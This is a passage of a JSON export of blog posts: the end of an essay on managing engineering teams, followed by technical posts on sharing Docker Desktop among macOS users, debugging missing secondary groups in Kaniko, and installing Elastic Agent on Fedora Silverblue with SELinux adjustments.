5% of their career. As a manager trying to build a high-functioning team, you should focus on making the most of this overlap to set them up for the other 95% of their career. Letting your direct report know that you are on their side and in it for the long-haul will build the rapport necessary for candor.\n\n**Life stories make honest goals approachable**\n\nTo build mutual respect, candor, and empathy, I like to take time in an early 1:1 to model it through sharing my life story, career journey, goals, and missteps. Next, it's your turn to listen intently to your report's own life story, noting that they may not be ready to share all of it. What you hear though, may surprise and shock you. Life isn't always sunshine and roses.\n\nFor subsequent 1:1's, I ask for the report to record their goals, both within the company and outside of it. These goals will be kept at the top of our 1:1 notes to always stay fresh within our minds when we meet. Mine reads:\n\n```\nCareer: make large-scale computing trivial for the world\nto use in a sustainable manner.\n\nNon-career: Accelerate human knowledge. Be a great father\nand spouse.\n```\n\nWith time, you should achieve the empathy and respect necessary to understand each other's personal and professional motivation.\n\n## Purpose\n\nMany define successful management as the ability to get the most out of the team. Now that you have learned about each individual's motivation, it is time to find the common thread that binds the team together. This shared context will help you build a plan to harmoniously fit everyone's local maximum (personal motivation) into the global maximum (personal+team+company motivation).\n\nTo discover this thread, I recommend first sharing the mission and value statements of other teams, and then letting your team discover define their own statement of values. These values should be ideals or traits that your team cannot live without. Once defined, your team is ready to create a mission statement. A mission statement should:\n\n* Align with the mission of the group above, if applicable\n* Clarify who your team serves\n* Be worded precisely enough to not apply to other teams\n\nDepending on the team size, expect that this may take three different 45-minute meetings to brainstorm and refine it. Your team may resist the idea of brainstorming a mission at first, but once they learn what everyone agrees is essential, they will appreciate the clarity.\n\nFor suggestions on how to run a successful exploration of mission statement \u0026 values, I highly recommend reading _Tribal Leadership: Leveraging Natural Groups to Build a Thriving Organization_ by Logan, King, Fischer-Wright.\n\n## Craftsmanship\n\nSoftware engineers at their heart are craftspeople. As with any other craft trade, software engineers intrinsically want to be proud of what they create. Craftsmanship is an important trait to cultivate as it paves the way for:\n\n* High morale\n* Product excellence\n* Prevention of technical debt\n\nEven when one is racing the revenue clock, deprioritizing craftsmanship is never the answer. If you push engineers toward deadline-driven development, you may very well be causing them to lower the code quality bar. If not addressed immediately, the decreased code quality generates a vicious circle of low morale, low velocity, high turnover, and an ever-increasing pile of technical debt.\n\nIf you encourage your team to build artifacts (code, design docs) that they can be proud of throughout their career, you will no longer have to worry much about motivation.\n\nFor more on craftsmanship in software, I recommend _Software Craftsman, The: Professionalism, Pragmatism, Pride_ by Sandro Mancuso.","tags":[],"images":["https://i.snap.as/dYE1fHaq.jpg"],"paid":false,"full_post_url":"","views":178,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"1m7lmcahwg8gtjgj","slug":"persistent-multi-user-docker-on-macos","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2021-02-01T16:36:01Z","updated":"2023-01-03T15:06:12Z","title":"Persistent multi-user Docker on macOS","body":"![](https://i.snap.as/o4QoLGWZ.webp)\n\nEver wanted to run Docker on an unmanned macOS machine, where all users could have access to a working Docker command-line?\n\nFirst, be aware that `docker` is not designed to be securely shared among multiple users. As with Linux, Please assume that anyone who has access to `docker` is effectively equivalent to \\`root'.\n\n\u003c!--more--\u003e\n\nThis assumes that users will be interacting with `docker` via the command-line, rather than graphically. It also assumes that the environment is such that allows a single user to be automatically logged into via the GUI, but this is mostly out of laziness rather than an underlying technical restriction.\n\n1. Choose an account that Docker Desktop will run as. I recommend creating a `docker` user, but it could be any account. This account does not need admin access.\n\n2. Open `Settings -\u003e Users \u0026 Groups -\u003e Login Options`, and ensure that this user is automatically logged into.\n\n3. Created a shared containers directory:\n\n```\nsudo mkdir -p /Users/Shared/Library/Containers\nsudo chown docker:staff /Users/Shared/Library/Containers\nsudo chmod -R 770 /Users/Shared/Library/Containers/\n```\n\n4. Login graphically with the account that will run Docker and start `/Applications/Docker.app`, answer any questions it might have.\n\n5. Open `Settings -\u003e Users \u0026 Groups -\u003e Login Items`, and drag the `Docker` app to it.\n\n6. Quit `Docker Desktop` via the menu item\n\n7. Open `Terminal` and move your Docker data to a shared location that can be written to by other users:\n\n```\nmv ~/Library/Containers/com.docker.docker /Users/Shared/Library/Containers\n\nchmod -R 770 /Users/Shared/Library/Containers/com.docker.docker\n\nchmod -R +a \"group:staff allow list,add_file,search,add_subdirectory,delete_child,readattr,writeattr,readextattr,writeextattr,readsecurity,file_inherit,directory_inherit\" /Users/Shared/Library/Containers/com.docker.docker\n\nchmod -R g+rw /Users/Shared/Library/Containers/com.docker.docker/Data\n```\n\nThen link your local Docker data to this shared source, and make sure that others can traverse into this folder to resolve the socket symlink:\n\n```\nln -s /Users/Shared/Library/Containers/com.docker.docker ~/Library/Containers/com.docker.docker\n\nchmod g+x ~/Library ~/Library/Containers\n```\n\n6. Restart `/Applications/Docker.app` to test\n\n7. SSH into the host as another username, and run `docker run mariadb` to test.\n\n8. Reboot host and reconnect via ssh to test (it may take a moment for Docker to start up)\n\nThis is the configuration we use for the #kernelcafe. Please add your improvements to the comments!","tags":["kernelcafe"],"categories":[{"hashtag":"kernelcafe","slug":"kernelcafe","title":"kernelcafe","post_count":0}],"images":["https://i.snap.as/o4QoLGWZ.webp"],"paid":false,"full_post_url":"","views":164,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"11k8jre0vq1sqayt","slug":"go-and-secondary-groups-a-kaniko-adventure","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2020-04-10T04:00:00Z","updated":"2023-01-03T15:14:55Z","title":"Go \u0026 secondary groups: a kaniko adventure!","body":"![](https://i.snap.as/jEcOae4C.jpg)\n\nI wanted to get my feet wet with understanding [Kaniko](https://github.com/GoogleContainerTools/kaniko), an open-source in-cluster builder for Docker images. I happen to work with one of the maintainers, Tejal, and I asked her if there was any interesting UNIX-internals sort of bugs that might be interesting.\n\nHere's the [mystery issue](https://github.com/GoogleContainerTools/kaniko/issues/1097): \"The USER command does not set the correct gids, so extra groups are dropped\". Here's an example to reproduce it:\n\n\u003c!--more--\u003e\n\n```\nFROM ubuntu:latest\nRUN groupadd -g 20000 bar\nRUN groupadd -g 10000 foo\nRUN useradd -c \"Foo user\" -u 10000 -g 10000 -G bar -m foo\nRUN id foo\nUSER foo\nRUN id\n```\n\nIn an ideal world, both \"id\" commands should give the same output, but the second one did not include `foo`'s membership in `bar`. This definitely sounded\nlike a secondary group issue. I happened to know that secondary groups were bolted onto the UNIX implementation some 10 years later than primary groups (SVR4, by way of BSD).\n\n## How to reproduce\n\nFirst, get a shell into the Kaniko debug image, mounting in the out/ and integration/ subdirectory:\n\n```shell\ndocker run -it --entrypoint /busybox/sh -v \"$HOME\"/.config/gcloud:/root/.config/gcloud -v (pwd)/integration:/workspace -v (pwd)/out:/out gcr.io/kaniko-project/executor:debug\n```\n\nI placed their Dockerfile into `kaniko/integration/1097`, which was mounted as `/workspace`. I could then trivially reproduce their case using kaniko:\n\n```shell\n/kaniko/executor -f 1097 --context=dir://workspace --destination=gcr.io/kaniko/test --tarPath=/tmp/image.tar --no-push\n```\n\n## Finding the culprit\n\nThe first question was: how does Kaniko implement user switching? Are they switching in such a way that populates secondary groups? I ask because the standard syscalls (`seteuid`, `setegid`) do not implement secondary groups: one has to instead call [`setgroups`](https://linux.die.net/man/2/setgroups). Here's what I found:\n\n```go\ncmd.SysProcAttr.Credential = \u0026syscall.Credential{Uid: uid, Gid: gid}\n```\n\n`[SysProcAttr](https://golang.org/pkg/syscall/#SysProcAttr)` is not exactly a well-known feature in Go, but it's perfect for setting exec attributes such as:\n\n* `Chroot` - lock the process into a directory\n* `Pdeathsig` -  Signal that the process will get when its parent dies (Linux only)\n* ... and many options for user namespacing: handy for container tools.\n\nSo, I figured it would be easy enough to improve the function in such a way that performs secondary group impersonation. The trick to you, dear reader, is to find the flaw!\n\n```go\nfunc impersonate(userStr string) (*syscall.Credential, error) {\n   ...\n   groups := []uint32{}\n   gidStr, err := u.GroupIds()\n   logrus.Infof(\"groupstr: %s\", gidStr)\n\n   for _, g := range gidStr {\n       i, err := strconv.ParseUint(g, 10, 32)\n       if err != nil {\n           return nil, errors.Wrap(err, \"parseuint\")\n       }\n       groups = append(groups, uint32(i))\n   }\n\n   return \u0026syscall.Credential{\n       Uid:    uid,\n       Gid:    gid,\n       Groups: groups,\n   }, nil\n}\n```\n\nAfter running `make`, I hop back into the container to run the repro case, and I'm perplexed by the log message:\n\n`INFO[0013] u.GroupIds returned: []`\n\nIs kaniko running in some alternate chroot universe where it can't see? I double check by adding a shell command:\n\n```go\nout, err = exec.Command(\"grep\", \"foo\", \"/etc/group\").Output()\n```\n\nThe answer is no. At this point, there are only two options in my mind. Either this is a Go bug, or, if Go is using libc to make this call (likely),\nit's a libc bug, or at least a disagreement between the two systems. As soon as you have made the decision to blame the compiler, it's time to gather evidence, typically by making a simpler test case. I opt first to investigate if Go is using libc to look up the list of secondary groups, starting with:\n\n* [os/user/listgroups_unix.go](https://golang.org/src/os/user/listgroups_unix.go)\n\nA couple of nested functions later, and you can see that it's calling:\n\n```c\nstatic int mygetgrouplist(const char* user, gid_t group, gid_t* groups, int* ngroups) {\n  return getgrouplist(user, group, groups, ngroups);\n}\n```\n\nThis is almost the same implementation you see in busybox's `id` command [source](https://github.com/brgl/busybox/blob/master/coreutils/id.c)\n\n```c\nstatic int get_groups(const char *username, gid_t rgid, gid_t *groups, int *n)\n{\n  int m;\n   if (username) {\n   \t m = getgrouplist(username, rgid, groups, n);\n   \t return m;\n   }\n```\n\nNow, it's possible that Go is setting `ngroups` to 0, so we just build a little test case program:\n\n```go\nfunc main() {\n    u, err := user.Lookup(os.Args[1])\n    if err != nil {\n   \t panic(fmt.Sprintf(\"lookup failed: %v\", err))\n    }\n```\n\nThe test program runs great on macOS, but when I use [xgo](https://github.com/karalabe/xgo) to cross-compile it for Linux, all it outputs is:\n\n```\n-rwxr-xr-x    1 0        0          2125099 Mar 28 20:26 ggroups-linux-amd64\n\n# ./ggroups-linux-amd64\n/busybox/sh: ./ggroups-linux-amd64: not found\n```\n\nIf you ever see this error in UNIX, it usually means one of three things:\n\n* The program specifies an invalid `#!` line\n* The binary needs a shared library that does not exist\n* The binary is for the wrong architecture\n\nIn this case, I suspected #2, because I see that busybox is in use, chances are pretty high that this Docker image lacks libc. This environment\ndoes not have `ldd`, but it has `strings`, so I can get some hints about the binary that was built:\n\n```\nstrings /out/ggroups-linux-amd64  | head\nbhkFaBAPgWy3KAp2RQcd/llKGprZSMM7cCxIzwmJ9/0QgnPM9q9pk--9IIyIXn/X9bTurj9MBmKtnVL-ANT\n/lib64/ld-linux-x86-64.so.2\nATUSH\n```\n\nIt looks like the right architecture, but yeah, that library doesn't exist. Just to confirm my sanity, I confirmed this program works great in an ubuntu container. I immediately suspect that either kaniko's user environment is trash, or kaniko is up to shenanigans in their `Makefile`. The easier is easier to check, and it doesn't take long to notice:\n\n```make\nout/executor: $(GO_FILES)\n\tGOARCH=$(GOARCH) GOOS=linux CGO_ENABLED=0 go build -ldflags \n       $(GO_LDFLAGS) -o $@ $(EXECUTOR_PACKAGE)\n```\n\nGod damnit. kaniko works because they disable `cgo` to workaround the lack of a libc environment. Look back at [listgroups_unix.go](https://golang.org/src/os/user/listgroups_unix.go) - it uses C code, and the build rule specifically states only to build with cgo. If we look at the fallback implementation, we see:\n\n```\nfunc listGroups(*User) ([]string, error) {\n    if runtime.GOOS == \"android\" || runtime.GOOS == \"aix\" {\n        return nil, fmt.Errorf(\"user: GroupIds not implemented on %s\", runtime.GOOS)\n    }\n    return nil, errors.New(\"user: GroupIds requires cgo\")\n}\n```\n\nBut wait - we didn't see an error in our impersonate function! I try to compile it without cgo:\n\n```\nenv CGO_ENABLED=0 go run ggroups.go root\npanic: groupids failed: user: GroupIds requires cgo\n\ngoroutine 1 [running]:\nmain.main()\n    /Users/tstromberg/src/ggroups/ggroups.go:18 +0x117\nexit status 2\n```\n\n## The mystery deepens\n\nIf you see an error in one environment, and not the other, chances are either:\n\n* A compiler error\n* A kernel error\n* You forgot to check the error code.\n\nIt's almost always the last option. Sure enough:\n\n```go\n   gidStr, err := u.GroupIds()\n   logrus.Infof(\"groupstr: %s\", gidStr)\n```\n\nAs soon as I noticed this, I walked away from my computer for an hour. I suggest you do the same.","tags":[],"images":["https://i.snap.as/jEcOae4C.jpg"],"paid":false,"full_post_url":"","views":135,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}}]}],"posts":[{"id":"y6rx9sy0iiqwbqa6","slug":null,"appearance":"","language":"en","rtl":false,"type":null,"created":"2024-05-15T15:19:08Z","updated":"2024-05-15T16:38:39Z","title":"Elastic Agent on Fedora SilverBlue","body":"This is a small technical article to save other adventurous people some pain.\n\n![](https://i.snap.as/5egRAV78.jpg)\n\nThe Elastic Agent installer fails to install on immutable Linux distributions such as Fedora SilverBlue or Ubuntu Core, because /usr is read-only. These instructions modify the elastic-agent 8.13.4 installer and the SELinux configuration to allow daemons to start from /opt/bin:\n\n```\nsed -i s/\"\\/usr\\/bin\\/elastic-agent\"/\"\\/opt\\/bin\\/elastic-agent\"/ elastic-agent\nsudo semanage fcontext -a -t bin_t \"/var/opt/bin(/.*)?\"                                                            sudo restorecon -R -v /var/opt/bin/\n```\n\nWith those modifications, the Elastic 8.13.4 installer works properly, but let's dig into how I got there ...\n\n\u003c!--more--\u003e\n\n## The Original Error\n\nHere's what an install session normally looks like on Fedora SilverBlue (BlueFin):\n\n```\nsudo ./elastic-agent install --force --url=https://endpoint\n\n[    ] Successfully copied files  [1s] Error uninstalling.  Printing logs\nError: error installing package: failed to write shell wrapper (/usr/bin/elastic-agent): open /usr/bin/elastic-agent: read-only file system\nFor help, please see our troubleshooting guide at https://www.elastic.co/guide/en/fleet/8.13/fleet-troubleshooting.html\n```\n\nYou can workaround this first hurdle by modifying the agent to use /usr/bin to /opt/bin:\n\n```\nsed -i s/\"\\/usr\\/bin\\/elastic-agent\"/\"\\/opt\\/bin\\/elastic-agent\"/ elastic-agent\n```\n\nThe reason `sed` works well to modify a binary is that \"/usr/bin/elastic-agent\" and \"/opt/bin/elastic-agent\" are the same-sized string.\n\n## SELinux\n\nIf you re-run the script now, it will get a little further, but hang here:\n\n```\n[=   ] Service Started  [2s] Elastic Agent successfully installed, starting enrollment.\n[=   ] Waiting For Enroll...  [2s] Error initializing version information: reading package version from file \"/var/opt/Elastic/Agent/package.version\": open /var/opt/Elastic/Agent/package.version: no such file or directory\n```\n\nIf so, hit Ctrl-Z to explore, as the installer will timeout. Let's see what's going on with the Elastic agent:\n\n```\nsudo systemctl status --full --lines=100 elastic-agent                                       \n```\n\nThe problem is that ExecStart is failing with 203/EXEC.\n\n```\n● elastic-agent.service - Elastic Agent is a unified agent to observe, monitor and protect your system.\n     Loaded: loaded (/etc/systemd/system/elastic-agent.service; enabled; preset: disabled)\n    Drop-In: /usr/lib/systemd/system/service.d\n             └─10-timeout-abort.conf\n     Active: activating (auto-restart) (Result: exit-code) since Wed 2024-05-15 10:45:54 EDT; 1min 30s ago\n    Process: 15454 ExecStart=/opt/bin/elastic-agent (code=exited, status=203/EXEC)\n   Main PID: 15454 (code=exited, status=203/EXEC)\n        CPU: 713us\n```\n\n203/EXEC is usually invoked when the target of ExecStart does not exist. You'll find that it does exist and even executes properly.  It turns out that any error in execution, including SELinux, will also result in the same error code. If you run `journalctl -f`, you may see this innocuous-looking message:\n\n```\nMay 15 10:54:45 fedora audit[16492]: AVC avc:  denied  { execute } for  pid=16492 comm=\"(ic-agent)\" name=\"elastic-agent\" dev=\"dm-0\" ino=505894 scontext=system_u:system_r:init_t:s0 tcontext=unconfined_u:object_r:var_t:s0 tclass=file permissive=0\n```\n\nApparently, SELinux does not allow systemd to start programs from /opt. The AVC here stands for \"Access Vector Cache\".  The first workaround I arrived at was modifying `ExecStart` to `/bin/sh /opt/bin/elastic-agent`, but the real fix is changing our SELinux configuration to allow binaries to start from this directory:\n\n```\nsudo semanage fcontext -a -t bin_t \"/var/opt/bin(/.*)?\"\nsudo restorecon -R -v /var/opt/bin/\n```\n\nNow that you have SELinux configured properly, the agent should start up:\n\n```\nsudo systemctl restart elastic-agent\n```\n\nIf you suspended the original agent installer as I did, you can resume it with `fg` and see that it's properly enrolled:\n\n```\nSend job 1 (sudo ./elastic-agent install --force --url=https://wherever.fleet.us-central1.gcp.cloud.es.io:443 --enrollment-token=xyz== --tag=t) to foreground\n[=== ] Waiting For Enroll...  [21m53s] {\"log.level\":\"info\",\"@timestamp\":\"2024-05-15T11:07:45.132-0400\",\"log.origin\":{\"file.name\":\"cmd/enroll_cmd.go\",\"file.line\":482},\"message\":\"Restarting agent daemon, attempt 0\",\"ecs.version\":\"1.6.0\"}\n{\"log.level\":\"info\",\"@timestamp\":\"2024-05-15T11:07:45.132-0400\",\"log.origin\":{\"file.name\":\"cmd/enroll_cmd.go\",\"file.line\":300},\"message\":\"Successfully triggered restart on running Elastic Agent.\",\"ecs.version\":\"1.6.0\"}\nSuccessfully enrolled the Elastic Agent.\n[=== ] Done  [21m53s]                           \nElastic Agent has been successfully installed.\n```\n\nSuccess!","tags":[],"images":["https://i.snap.as/5egRAV78.jpg"],"paid":false,"full_post_url":"","views":81,"likes":0}]}